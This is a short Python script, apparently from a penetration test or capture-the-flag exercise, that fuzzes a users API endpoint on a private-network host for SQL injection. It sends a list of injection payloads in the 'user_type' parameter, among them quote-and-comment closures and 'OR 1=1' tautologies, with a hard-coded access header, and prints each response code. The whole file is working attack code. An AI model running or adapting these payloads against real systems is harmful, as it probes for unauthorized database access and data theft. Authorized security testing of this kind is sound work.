#!/usr/bin/env python3
import requests

BASE_URL = "http://192.168.100.110:3333"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def check(payload):
    params = {"user_type": payload, "fields": "student_id"}
    try:
        resp = requests.get(f"{BASE_URL}/api/v1/users", params=params, headers=HEADERS)
        status = resp.status_code
        print(f"[{status}] Payload: {payload}")
    except:
        pass


print("=== Fuzzing SQL Injection Closures ===")
payloads = [
    "students') --",
    "students')) --",
    "students' ) --",
    "students' AND 1=1 --",
    "students' OR 1=1 --",
    "students'; --",
    "students'/*",
    "students' /*",
    "students' or 'a'='a",
    'students\' or "a"="a',
    'students" --',
    'students") --',
    'students")) --',
    "students' -- -",
    "students' --+",
    "students' -- ",
]

for p in payloads:
    check(p)
